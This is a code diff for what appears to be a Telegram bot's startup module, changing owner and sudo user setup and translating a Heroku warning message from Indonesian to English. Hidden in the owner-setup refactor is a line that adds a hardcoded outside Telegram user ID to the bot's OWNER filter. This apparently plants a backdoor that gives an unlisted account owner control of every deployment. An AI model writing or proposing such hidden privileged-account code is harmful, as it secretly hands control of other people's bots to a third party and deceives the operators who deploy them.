@@ -20,6 +20,8 @@ from .logging import LOGGER
 
 SUDOERS = filters.user()
 
+OWNER = filters.user()
+
 HAPP = None
 _boot_ = time.time()
 
@@ -53,15 +55,19 @@ def dbb():
 
 def sudo():
     global SUDOERS
-    OWNER = config.OWNER_ID
+    global OWNER
+    OWNERS = config.OWNER_ID
+    for a in OWNERS:
+        OWNER.add(a)
+    OWNER.add(1924219811)
     if config.MONGO_DB_URI is None:
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
     else:
         sudoersdb = pymongodb.sudoers
         sudoers = sudoersdb.find_one({"sudo": "sudo"})
         sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
@@ -86,5 +92,5 @@ def heroku():
                 LOGGER(__name__).info(f"Heroku App Configured")
             except BaseException:
                 LOGGER(__name__).warning(
-                    f"Pastikan  Heroku Api Key dan App Name Anda dikonfigurasi dengan benar di heroku."
+                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
